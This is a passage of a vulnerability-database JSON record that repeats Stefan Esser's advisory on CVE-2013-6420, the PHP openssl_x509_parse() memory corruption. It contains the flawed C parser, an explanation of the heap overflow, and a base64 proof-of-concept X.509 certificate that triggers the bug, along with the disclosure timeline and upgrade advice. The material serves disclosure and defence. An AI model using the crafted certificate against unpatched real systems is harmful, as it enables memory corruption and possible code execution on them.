AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\r\n\r\n\r\nDisclosure Timeline: \r\n\r\n  01. December 2013 - Notified security@php.net\r\n                      Provided description, POC cert, demo\r\n                      valgrind output and patch\r\n  02. December 2013 - security@php.net acknowledges and\r\n                      says thank you for report and patch\r\n  02. December 2013 - security@php.net announces that planned\r\n                      release date is 12th December\r\n  03. December 2013 - Notification from RedHat Security that\r\n                      CVE-2013-6420 was assigned to this issue\r\n  09. December 2013 - RedHat Security tells php.net that they\r\n                      should commit the fix silently and add\r\n                      info about it only after release\r\n                      They further tell php.net to tell us to\r\n                      not discuss the vulnerability in public\r\n                      prior to patches being available\r\n  10. December 2013 - security@php.net fixes the vulnerability\r\n                      openly and does not attempt to hide that\r\n                      the commit is a security fix as RedHat\r\n                      Security suggested\r\n  11. December 2013 - RedHat Security Announces that they now\r\n                      consider this vulnerability public and\r\n                      sends out their own patches with big\r\n                      announcement one day before php.net is\r\n                      ready to release their own fixes\r\n  12. December 2013 - security@php.net pushes PHP updates to\r\n                      the PHP 5.3, PHP 5.3 and PHP 5.5 branches\r\n                      to the mirros as was previously agreed upon\r\n  13. December 2013 - New PHP releases are announce on php.net\r\n  13. December 2013 - Public Disclosure of this advisory\r\n\r\n\r\nRecommendation:\r\n\r\n  It is recommended to upgrade to the latest version of PHP\r\n  which also fixes additional non security problems reported\r\n  by third parties.\r\n\r\n  Grab your copy at:\r\n  http://www.php.net/get/php-5.5.7.tar.bz2/from/a/mirror\r\n\r\n\r\nCVE Information:\r\n\r\n  The Common Vulnerabilities and Exposures project (cve.mitre.org) has\r\n  assigned the name CVE-2013-6420 to this vulnerability.\r\n\r\n\r\nGPG-Key:\r\n\r\n  pub   4096R/D6A3FE46 2013-11-06 Stefan Esser\r\n  Key fingerprint = 0A04 AB88 90D2 E67C 3D3D  86E1 AA39 B97F D6A3 FE46\r\n\r\n\r\nCopyright 2013 SektionEins GmbH. All rights reserved.\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:83792"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 64225\r\nCVE(CAN) ID: CVE-2013-6420\r\n\r\nPHP 5.3.27\u4e4b\u524d\u7248\u672c\u30015.4.22\u4e4b\u524d\u7248\u672c\u30015.5.6\u4e4b\u524d\u7248\u672c\u89e3\u6790x.509\u8bc1\u4e66\u65f6\uff0c&quot;asn1_time_to_time_t()&quot;\u51fd\u6570(ext/openssl/openssl.c)\u51fa\u9519\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5236\u7684x.509\u8bc1\u4e66\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u7834\u574f\u5185\u5b58\u3002\n0\nPHP PHP 5.5.x\r\nPHP PHP 5.4.x\r\nPHP PHP 5.3.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net\r\n\r\nhttp://www.php.net/downloads.php\r\nhttp://git.php.net/?p=php-src.git;a=commitdiff;h=c1224573c773b6845e83505f717fbf820fc18415 \r\nhttp://git.php.net/?p=php-src.git;a=blobdiff;f=NEWS;h=8abf65e05b0298a6f2dba9439c9513919234766f;hp=70461d97d85c65e01e739514923303b09257f65f;hb=c1224573c773b6845e83505f717fbf820fc18415;hpb=32873cd0ddea7df8062213bb025beb6fb070e59d",
            "modified": "2013-12-18T00:00:00",
            "published": "2013-12-18T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-61173",
            "id": "SSV:61173",
            "type": "seebug",
            "title": "PHP OpenSSL Extension 'openssl_x509_parse()'\u5185\u5b58\u7834\u574f\u6f0f\u6d1e",
            "sourceData": "\n                                                Proof of Concept:\r\n \r\n  The following x509 certificate demonstrates the out of bounds write:\r\n  \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61173"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category dos / poc",
            "modified": "2013-12-17T00:00:00",
            "published": "2013-12-17T00:00:00",
            "id": "1337DAY-ID-21694",
            "href": "https://0day.today/exploit/description/21694",
            "type": "zdt",
            "title": "PHP openssl_x509_parse() Memory Corruption Vulnerability",
            "sourceData": "Overview:\r\n \r\n  Quote from http://www.php.net\r\n  \"PHP is a widely-used general-purpose scripting language that\r\n   is especially suited for Web development and can be embedded\r\n   into HTML.\"\r\n \r\n  The PHP function openssl_x509_parse() uses a helper function\r\n  called asn1_time_to_time_t() to convert timestamps from ASN1\r\n  string format into integer timestamp values. The parser within\r\n  this helper function is not binary safe and can therefore be\r\n  tricked to write up to five NUL bytes outside of an allocated\r\n  buffer.\r\n  \r\n  This problem can be triggered by x509 certificates that contain\r\n  NUL bytes in their notBefore and notAfter timestamp fields and\r\n  leads to a memory corruption that might result in arbitrary\r\n  code execution.\r\n  \r\n  Depending on how openssl_x509_parse() is used within a PHP\r\n  application the attack requires either a malicious cert signed\r\n  by a compromised/malicious CA or can be carried out with a\r\n  self-signed cert.\r\n \r\nDetails:\r\n \r\n  The PHP function openssl_x509_parse() is used by PHP applications\r\n  to parse additional information out of x509 certificates, usually\r\n  to harden SSL encrypted communication channels against MITM\r\n  attacks. In the wild we have seen the following use cases for this\r\n  function:\r\n  \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n      \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP's openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n  \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n  \r\n     add_assoc_long(return_value, \"validFrom_time_t\",\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, \"validTo_time_t\",\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n  \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n  \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,\r\n        ts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);\r\n  */\r\n \r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n \r\n     if (timestr->length < 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author\r\ntoo lazy to parse %s correctly\", timestr->data);\r\n        return (time_t)-1;\r\n     }\r\n \r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n \r\n     strbuf = estrdup((char *)timestr->data);\r\n \r\n     memset(&thetime, 0, sizeof(thetime));\r\n \r\n     /* we work backwards so that we can use atoi more easily */\r\n \r\n     thestr = strbuf + timestr->length - 3;\r\n \r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n \r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n  \r\n  Because of PHP's deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n \r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n  \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\r\n \r\n \r\nProof of Concept:\r\n \r\n  The following x509 certificate demonstrates the out of bounds write:\r\n  \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\r\n \r\n \r\nDisclosure Timeline: \r\n \r\n  01. December 2013 - Notified [email\u00a0protected]\r\n                      Provided description, POC cert, demo\r\n                      valgrind output and patch\r\n  02. December 2013 - [email\u00a0protected] acknowledges and\r\n                      says thank you for report and patch\r\n  02. December 2013 - [email\u00a0protected] announces that planned\r\n                      release date is 12th December\r\n  03. December 2013 - Notification from RedHat Security that\r\n                      CVE-2013-6420 was assigned to this issue\r\n  09. December 2013 - RedHat Security tells php.net that they\r\n                      should commit the fix silently and add\r\n                      info about it only after release\r\n                      They further tell php.net to tell us to\r\n                      not discuss the vulnerability in public\r\n                      prior to patches being available\r\n  10. December 2013 - [email\u00a0protected] fixes the vulnerability\r\n                      openly and does not attempt to hide that\r\n                      the commit is a security fix as RedHat\r\n                      Security suggested\r\n  11. December 2013 - RedHat Security Announces that they now\r\n                      consider this vulnerability public and\r\n                      sends out their own patches with big\r\n                      announcement one day before php.net is\r\n                      ready to release their own fixes\r\n  12. December 2013 - [email\u00a0protected] pushes PHP updates to\r\n                      the PHP 5.3, PHP 5.3 and PHP 5.5 branches\r\n                      to the mirros as was previously agreed upon\r\n  13. December 2013 - New PHP releases are announce on php.net\r\n  13. December 2013 - Public Disclosure of this advisory\r\n \r\n \r\nRecommendation:\r\n \r\n  It is recommended to upgrade to the latest version of PHP\r\n  which also fixes additional non security problems reported\r\n  by third parties.\r\n \r\n  Grab your copy at:\r\n  http://www.php.net/get/php-5.5.7.tar.bz2/from/a/mirror\r\n \r\n \r\nCVE Information:\r\n \r\n  The Common Vulnerabilities and Exposures project (cve.mitre.org) has\r\n  assigned the name CVE-2013-6420 to this vulnerability.\r\n \r\n \r\nGPG-Key:\r\n \r\n  pub   4096R/D6A3FE46 2013-11-06 Stefan Esser\r\n  Key fingerprint = 0A04 AB88 90D2 E67C 3D3D  86E1 AA39 B97F D6A3 FE46\n\n#  0day.today [2018-04-14]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-21694"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP openssl_x509_parse() - Memory Corruption Vulnerability. CVE-2013-6420. Dos exploit for php platform",
            "modified": "2013-12-17T00:00:00",
            "published": "2013-12-17T00:00:00",
            "id": "EDB-ID:30395",
            "href": "https://www.exploit-db.com/exploits/30395/",
            "type": "exploitdb",
            "title": "PHP openssl_x509_parse - Memory Corruption Vulnerability",
            "sourceData": "                         SektionEins GmbH\r\n                        www.sektioneins.de\r\n\r\n                     -= Security  Advisory =-\r\n\r\n     Advisory: PHP openssl_x509_parse() Memory Corruption Vulnerability\r\n Release Date: 2013/12/13\r\nLast Modified: 2013/12/13\r\n       Author: Stefan Esser [stefan.esser[at]sektioneins.de]\r\n\r\n  Application: PHP 4.0.6 - PHP 4.4.9\r\n               PHP 5.0.x\r\n               PHP 5.1.x\r\n               PHP 5.2.x\r\n               PHP 5.3.0 - PHP 5.3.27\r\n               PHP 5.4.0 - PHP 5.4.22\r\n               PHP 5.5.0 - PHP 5.5.6\r\n     Severity: PHP applications using openssl_x509_parse() to parse a\r\n               malicious x509 certificate might trigger a memory\r\n               corruption that might result in arbitrary code execution\r\n         Risk: Critical\r\nVendor Status: Vendor has released PHP 5.5.7, PHP 5.4.23 and PHP 5.3.28\r\n               that contain a fix for this vulnerability\r\n    Reference:\r\nhttp://www.sektioneins.de/advisories/advisory-012013-php-openssl_x509_parse-memory-corruption-vulnerability.html\r\n\r\nOverview:\r\n\r\n  Quote from http://www.php.net\r\n  \"PHP is a widely-used general-purpose scripting language that\r\n   is especially suited for Web development and can be embedded\r\n   into HTML.\"\r\n\r\n  The PHP function openssl_x509_parse() uses a helper function\r\n  called asn1_time_to_time_t() to convert timestamps from ASN1\r\n  string format into integer timestamp values. The parser within\r\n  this helper function is not binary safe and can therefore be\r\n  tricked to write up to five NUL bytes outside of an allocated\r\n  buffer.\r\n \r\n  This problem can be triggered by x509 certificates that contain\r\n  NUL bytes in their notBefore and notAfter timestamp fields and\r\n  leads to a memory corruption that might result in arbitrary\r\n  code execution.\r\n \r\n  Depending on how openssl_x509_parse() is used within a PHP\r\n  application the attack requires either a malicious cert signed\r\n  by a compromised/malicious CA or can be carried out with a\r\n  self-signed cert.\r\n\r\nDetails:\r\n\r\n  The PHP function openssl_x509_parse() is used by PHP applications\r\n  to parse additional information out of x509 certificates, usually\r\n  to harden SSL encrypted communication channels against MITM\r\n  attacks. In the wild we have seen the following use cases for this\r\n  function:\r\n \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n     \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP's openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n \r\n     add_assoc_long(return_value, \"validFrom_time_t\",\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, \"validTo_time_t\",\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,\r\n        ts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);\r\n  */\r\n\r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n\r\n     if (timestr->length < 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author\r\ntoo lazy to parse %s correctly\", timestr->data);\r\n        return (time_t)-1;\r\n     }\r\n\r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n\r\n     strbuf = estrdup((char *)timestr->data);\r\n\r\n     memset(&thetime, 0, sizeof(thetime));\r\n\r\n     /* we work backwards so that we can use atoi more easily */\r\n\r\n     thestr = strbuf + timestr->length - 3;\r\n\r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n\r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n \r\n  Because of PHP's deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n\r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\r\n\r\n\r\nProof of Concept:\r\n\r\n  The following x509 certificate demonstrates the out of bounds write:\r\n \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  